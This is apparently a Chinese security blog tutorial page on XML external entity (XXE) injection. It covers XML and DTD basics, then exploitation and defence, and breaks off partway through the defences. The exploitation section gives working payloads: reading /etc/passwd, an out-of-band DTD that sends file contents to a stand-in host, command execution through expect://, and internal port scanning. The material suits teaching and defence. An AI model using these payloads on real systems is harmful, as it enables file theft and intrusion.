@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="XXE漏洞(XML External Entity Injection)，XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者可以通过 XML 实体传递自己构造的恶意值，通过加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内部网站、发起dos攻击等危害。">
+<meta name="keywords" content="安全,XXE,XML">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透技术基础之XML外部实体注入（XXE）解析">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/index.html">
+<meta property="og:site_name" content="Six&#39;s Blog">
+<meta property="og:description" content="XXE漏洞(XML External Entity Injection)，XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者可以通过 XML 实体传递自己构造的恶意值，通过加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内部网站、发起dos攻击等危害。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-05T14:08:34.051Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透技术基础之XML外部实体注入（XXE）解析">
+<meta name="twitter:description" content="XXE漏洞(XML External Entity Injection)，XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者可以通过 XML 实体传递自己构造的恶意值，通过加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内部网站、发起dos攻击等危害。">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>渗透技术基础之XML外部实体注入（XXE）解析</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/05/15/DNS安全论文选读-An On-Demand Defense Scheme Against DNS Cache Poisoning Attacks/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/05/15/DNS安全论文选读-Is DNS Ready for Ubiquitous Internet of Things/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&text=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&is_video=false&description=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透技术基础之XML外部实体注入（XXE）解析&body=Check out this article: https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&name=渗透技术基础之XML外部实体注入（XXE）解析&description=&lt;p&gt;XXE漏洞(XML External Entity Injection)，XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者可以通过 XML 实体传递自己构造的恶意值，通过加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内部网站、发起dos攻击等危害。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&t=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML基础"><span class="toc-number">1.</span> <span class="toc-text">XML基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XML声明"><span class="toc-number">1.1.</span> <span class="toc-text">XML声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD文档类型定义"><span class="toc-number">1.2.</span> <span class="toc-text">DTD文档类型定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实体"><span class="toc-number">1.3.</span> <span class="toc-text">实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">2.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#引用外部实体方式"><span class="toc-number">2.1.</span> <span class="toc-text">引用外部实体方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用"><span class="toc-number">2.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#防御"><span class="toc-number">2.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透技术基础之XML外部实体注入（XXE）解析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Six's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-05-14T16:00:00.000Z" itemprop="datePublished">2019-05-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/XML/">XML</a>, <a class="tag-link" href="/tags/XXE/">XXE</a>, <a class="tag-link" href="/tags/安全/">安全</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>XXE漏洞(XML External Entity Injection)，XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者可以通过 XML 实体传递自己构造的恶意值，通过加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内部网站、发起dos攻击等危害。</p>
+<a id="more"></a>
+<p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p>
+<h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>XML 是可扩展标记语言（Extensible Markup Language）是一种用于标记电子文件使其具有结构性的标记语言。可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言[用户可以自己定义标签]。</p>
+<p>XML被设计用来传输和存储数据，其关注点是数据的内容，与之相比超文本标记语言（HTML）被设计用来显示数据，其关注点是数据的外观。</p>
+<p>XML使用元素和属性来描述数据。</p>
+<p>在数据传送过程中，XML始终保留了诸如父/子关系这样的数据结构。</p>
+<p>几个应用程序可以共享和解析同一个XML文件，不必使用传统的字符串解析或拆解过程。</p>
+<p>相反，普通文件不对每个数据段做描述(除了在头文件中)，也不保留数据关系结构。</p>
+<p>使用XML做数据交换可以使应用程序更具有弹性，因为可以用位置(与普通文件一样)或用元素名(从数据库)来存取XML数据。</p>
+<p>基本语法：</p>
+<blockquote>
+<p>- 所有 XML 元素都须有关闭标签。</p>
+<p>- XML 标签对大小写敏感。</p>
+<p>- XML 必须正确地嵌套。</p>
+<p>- XML 文档必须有根元素。</p>
+<p>- XML 的属性值须加引号。</p>
+</blockquote>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+<h4 id="XML声明"><a href="#XML声明" class="headerlink" title="XML声明"></a>XML声明</h4><p>XML 文档的第一行是一个 XML 声明。这是文件的<code>可选</code>部分，它将文件识别为 XML 文件，有助于工具和人类识别 XML（不会误认为是 SGML 或其他标记）。</p>
+<p>可以将这个声明简单地写成 <code>&lt;?xml?&gt;</code>，或包含 XML 版本（<code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>），甚至包含字符编码，比如针对 Unicode 的 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>。</p>
+<p>因为这个声明必须出现在文件的开头，所以如果打算将多个小的 XML 文件合并为一个大 XML 文件，则可以忽略这个可选信息。</p>
+<h4 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h4><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块，使用一系列合法的元素来定义文档的结构。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+<p>内部声明DTD：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>引用外部DTD:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>DTD文档中由很多重要的关键字：</p>
+<ul>
+<li>DOCTYPE(DTD声明)</li>
+<li>ENTITY (实体声明)</li>
+<li>SYSTEM,PYBLIC(外部资源申请)</li>
+</ul>
+<p>示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> //这一行是 XML 文档定义</span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT receiver (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT sender (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT header (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT msg (#PCDATA)&gt;]&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上面 DTD 定义了 XML 的根元素是 message，包括子元素receiver ,sender ,header ,msg，那么xml文档的形式为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>实体相当于变量，必须在DTD中进行定义声明，可以在文档中的其他位置引用该变量的值。</p>
+<p>实体类型主要包括：</p>
+<ul>
+<li>内置实体(Bilut-in entities)</li>
+<li>字符实体(Character entities)</li>
+<li>通用实体(General entities)</li>
+<li>参数实体(Parameter entities)</li>
+</ul>
+<p>实体根据其引用方式，还可以分为内部实体和外部实体。</p>
+<blockquote>
+<p>参数实体用<code>%实体名称</code>声明，引用时也用<code>%实体名称</code>；其余实体直接用实体名称申明，引用时用<code>&amp;实体名称</code></p>
+<p>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在XML文档中引用</p>
+</blockquote>
+<p><strong>内部实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 "实体值"&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>外部实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> 实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在URI中支持的实体主要包括file,http,https,ftp等，不同的语言支持的不一样。</p>
+<table>
+<thead>
+<tr>
+<th>libxml2</th>
+<th>php</th>
+<th>java</th>
+<th>.net</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file</td>
+<td>file</td>
+<td>http</td>
+<td>file</td>
+</tr>
+<tr>
+<td>http</td>
+<td>http</td>
+<td>https</td>
+<td>http</td>
+</tr>
+<tr>
+<td>ftp</td>
+<td>ftp</td>
+<td>ftp</td>
+<td>https</td>
+</tr>
+<tr>
+<td></td>
+<td>php</td>
+<td>file</td>
+<td>ftp</td>
+</tr>
+<tr>
+<td></td>
+<td>compress.zlib</td>
+<td>jar</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>compress.bzip2</td>
+<td>netdoc</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>data</td>
+<td>mailto</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>glob</td>
+<td>gopher*</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>phar</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>示例：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = "1.0" encoding = "utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY content SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;content;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>参数实体</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> %实体名称 "实体值"&gt;</span></span><br><span class="line">或</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> %实体名称 <span class="attr">SYSTEM</span> "<span class="attr">URI</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="引用外部实体方式"><a href="#引用外部实体方式" class="headerlink" title="引用外部实体方式"></a>引用外部实体方式</h4><p>方式一</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml varsion = "1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>方式二</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;? xml varsion = &quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY %d SYSTEM &quot;http://example.com/evil.dtd&quot;&gt;</span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure>
+<p>evil.dtd内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>方式三</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml varsion = "1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a SYSTEM "http://example.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>evil.dtd内容</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><ol>
+<li><p>读取任意文件</p>
+<p>引入一个实体，实体内容为本地文件。</p>
+<p>如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml varsion = "1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>如果读取文件时XML解释器生成错误，我们可以利用CDATA将原始内容显示出来，CDATA表示通知解释器，内容为常量不用进行解析。在利用CDATA时不能直接在XML中进行拼接，利用参数实体进行拼接。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE roottag [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % start "&lt;![CDATA["&gt;   </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % goodies SYSTEM "file:///d:/test.txt"&gt;  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % end "]]&gt;</span>"&gt;  </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">ip</span>/<span class="attr">evil.dtd</span>"&gt;</span> </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span>&amp;all;<span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>evil.dtd内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">all</span> "%<span class="attr">start</span>;%<span class="attr">goodies</span>;%<span class="attr">end</span>;"&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>无法回显时的blind XXE</p>
+<p>如果服务器没有回显，那么我们需要构建一条带外信道提取数据</p>
+<p>我们可以将数据发送到远程服务器，</p>
+<p>evil.dtd内容：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY %send SYSTEM 'http://example.com?%file'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+<p>触发后，我们指定的网址日志中就会得到file的内容。</p>
+</li>
+<li><p>执行系统命令</p>
+<p>在安装expect扩展的PHP环境里执行系统命令。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dir</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">file</span>&gt;</span>&amp;cmd;<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dir</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HTTP 内网主机探测</p>
+<p>以存在 XXE 漏洞的服务器为我们探测内网的支点。先利用 file 协议读取作为支点服务器的网络配置文件，，可以尝试读取 /etc/network/interfaces  或 /proc/net/arp 或 /etc/host 文件</p>
+</li>
+<li><p>HTTP 内网主机端口扫描</p>
+<p>把ip 地址固定，然后循环遍历端口就行，通过响应的时间的长短判断该该端口是否开放的可以结合burp suite。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  </span></span><br><span class="line"><span class="meta">&lt;!ELEMENT data (#PCDATA)&gt;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>4<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>文件上传</p>
+<p>Java 中有一个比较神奇的协议 jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的</p>
+<p>jar://协议格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jar:&#123;url&#125;!&#123;path&#125;</span><br><span class="line">ex:</span><br><span class="line">jar:http://host/application.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure>
+<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压;但phar://不能远程加载文件，所以 phar:// 一般用于绕过文件上传。</p>
+<p><strong>jar 协议处理文件的过程：</strong></p>
+<p>(1) 下载 jar/zip 文件到临时文件中<br>(2) 提取出我们指定的文件<br>(3) 删除临时文件</p>
+<p>为了找到这个临时的文件，我们可以请求一个在不存在的文件，那么可以根据报错找到这个临时文件。</p>
+</li>
+</ol>
+<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol>
+<li><p>使用语言中推荐的禁用外部实体的方法</p>
+<p>php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>
+<p>java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>);</span><br><span class="line">.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="keyword">false</span>)</span><br><span class="line">.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+<p>python</p>
